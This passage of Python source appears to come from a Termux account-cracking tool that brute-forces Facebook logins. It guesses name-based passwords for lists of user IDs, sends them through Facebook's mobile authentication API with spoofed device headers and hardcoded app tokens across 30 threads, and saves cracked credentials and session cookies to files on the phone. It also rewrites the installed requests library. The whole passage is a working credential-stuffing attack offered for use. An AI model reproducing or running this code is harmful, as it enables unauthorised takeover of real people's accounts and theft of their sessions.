                                        if 'y' in pcp:
                                                print(f'\r\r{B}❲{Y}ANKIT-CP{B}❳{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ANKIT-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:         
               time.sleep(2)
        except Exception as e:
                pass
#__________________| RANDOM METHOD M2 |__________________#
def rndm2(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{B}❲{G}NOT-ANKIT->M2{B}❳{G} %s {B}|{G} OK{B}|{G}CP{G} %s{B}|{G}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; V2027 Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)})[FBAN/FB4A;FBAV/45.0.0.{str(random.randint(1000,9000))};FBBV/{str(random.randint(100000,900000))};[FBAN/FB4A;FBAV/3.9;FBBV/666389;FBDM/'+'{density=1.0,width=320,height=480}'+';FBLC/en_US;FBCR/o2 - de;FBPN/com.facebook.katana;FBDV/HTC Desire 200;FBSV/4.0.3;FBOP/18;FBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':uid,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                "sim_country": "id",
                                "network_country": "id",
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':TWO(),
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{B}❲{G}ANKIT-OK{B}❳{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{B}❲{G}COOKIE{B}❳>{A} "+coki)
                                        open('/sdcard/ANKIT-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{B}❲{Y}ANKIT-CP{B}❳{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ANKIT-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:      
               time.sleep(20)
        except Exception as e:
                pass
#__________________| RANDOM METHOD M3 |__________________#
def rndm3(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{B}❲{G}NOT-ANKIT->M3{B}❳{G} %s {B}|{G} OK{B}|{G}CP{G} %s{B}|{G}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; V2027 Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)})[FBAN/FB4A;FBAV/45.0.0.{str(random.randint(1000,9000))};FBBV/{str(random.randint(100000,900000))};[FBAN/FB4A;FBAV/3.9;FBBV/666389;FBDM/'+'{density=1.0,width=320,height=480}'+';FBLC/en_US;FBCR/o2 - de;FBPN/com.facebook.katana;FBDV/HTC Desire 200;FBSV/4.0.3;FBOP/18;FBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':uid,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                "sim_country": "id",
                                "network_country": "id",
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{B}❲{G}ANKIT-OK{B}❳{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{B}❲{G}COOKIE{B}❳>{A} "+coki)
                                        open('/sdcard/ANKIT-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{B}❲{Y}ANKIT-CP{B}❳{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ANKIT-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:      
               time.sleep(20)
        except Exception as e:
                pass		
                
def password():
        with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'r') as file :
                filedata = file.read()
        filedata = filedata.replace('verify = False', 'verify = True')
        with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'w') as file:
                file.write(filedata)
        #If There is Verify False Also Then It Returns With True wala Verify
        if "verify = True" in filedata:
                pass
        else:
                with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'a') as file:
                        file.write('\nverify = True\n')

        os.system('clear')
        print (logo)
        print(" Cloning Is Started Kindly Be Patient ... ")
        print(" Turn Airplane On Off When There Is Alert ")
        print(" The Speed Of Tool Depended In Your Network")
        print(50*"-")
        with tred(max_workers=30) as pool:
                for yuzong in id:
                        idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                        frs = nmf.split(' ')[0]
                        frslst = nmf.replace(" ", "")
                        pwv = [nmf,'pakistan']
                        if len(nmf)<6:
                                if len(frs)<3:
                                        pass
                                else:
                                        pwv.append(frslst)
                                        pwv.append(frs+'123')
                                        pwv.append(frs+'12345')
                                        pwv.append(frs+'1122')
                                        pwv.append(nmf)
                                        pwv.append(frslst+'12345')
                                        pwv.append(frslst+'123')
                                        pwv.append(frslst+'12')
                                        pwv.append('khankhan')
                                        pwv.append('khan123')
                        else:
                                pwv.append(frslst)
                                pwv.append(frs+'123')
                                pwv.append(frs+'12345')
                                pwv.append(frs+'1122')
                                pwv.append(frs+'786')
                                pwv.append(nmf)
                                pwv.append(frslst+'12345')
                                pwv.append(frslst+'123')
                                pwv.append(frslst+'12')
                                pwv.append('khankhan')
                                pwv.append('khan123')
                        pool.submit(crackmbasic,idf,pwv)

#--(method-latest)----#
aks="auth.login"
djksj="b-"
asmr=f"{djksj}api.facebook.com"
koin = f"facebook.com"
grp = f"graph.{koin}"
auttt=f"auth"
import requests,re,random,string,secrets,os
def crackmbasic(idf,pwv):
        global ok,cp,loop
        sys.stdout.write(f"\r \033[0m[{aajdate}] {loop}/{len(id)} {ok} "),
        sys.stdout.flush()
        for pw in pwv:
                        ag = idf[::-1]
                        head = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) Mobile/nFGZ6 [FBAN/FBIOS;FBDV/iPhone13,1;FBSN/iOS;FBSV/262.463.500;FBSS/2;FBID/iPhone;FBLC/en_US;FBOP/5;FBRV/0];', 'accept-encoding': 'gzip,deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authentication': 'OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662', 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell', 'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'content-type': 'application/x-www-form-urlencoded', 'x-fb-friendly_name': 'authenticate'}
                        dataa = {'include_headers': 'False', 'decode_body_json': 'True', 'streamable_json_response': 'True', 'api_key': '6628568379', 'adid': 'C77d3d38Cf2CCab9', 'format': 'JSON', 'method': 'auth/login', 'email': idf, 'password': pw, 'credentials_type': 'password', 'error_detail_type': 'button_with_disabled', 'source': 'login', 'community_id': '0', 'currently_logged_in_userid': '0', 'meta_inf_fbmeta': 'NO_FILE', 'try_number': '1', 'attempt_login': 'true', 'return_multiple_errors': 'true', 'locale': 'en_US', 'client_country_code': 'en_US', 'access_token': '6628568379|c1e620fa708a1d5696fb991c1bde5662', 'server_timestamps': 'True', 'pretty': 'False', 'strip_defaults': 'True', 'strip_nulls': 'True', 'fb_api_caller_class': 'com.facebook.account.login.protocol.FbiosAuthHandler', 'fb_api_request_friendly_name': 'authenticate'}
                        r = requests.post(f"https://graph.facebook.com/auth/login",headers=head,verify=True,data=dataa)
                        ro = re.findall('uid": (.*?),',str(r.text))
                        try:
                                for roid in ro:
                                        pass
                        except:
                                roid = idf
                        if "www.facebook.com" in r.text:
                                print(f'   \r {rp}[QSR-CP] {idf} | {pw}{s}')     
                                open('/sdcard/qsr_cp.txt','a').write(roid+'|'+pw+'\n')
                                akun.append(idf+'|'+pw)
                                cp+=1
                                break
                        elif "session_key" in r.text:
                                ok+=1
                                print(f'   \r {rg}[QSR-OK] {roid} | {pw}{s}')
                                open('/sdcard/qsr_ok.txt','a').write(roid+'|'+pw+'\n')
                                break
                        elif "SMS shortly" in r.text:
                                print(f'   \r {rc}[QSR-2F] {idf} | {pw}{s}')
                                open('/sdcard/qsr_2f.txt','a').write(roid+'|'+pw+'\n')
                                break
                        else:
                                continue
        loop+=1
           				    				    				    				    				    				    				    		
try:
	menu()
	#update()    
except requests.exceptions.ConnectionError:
	print('\n No internet connection ...')
	exit()
except:exit()
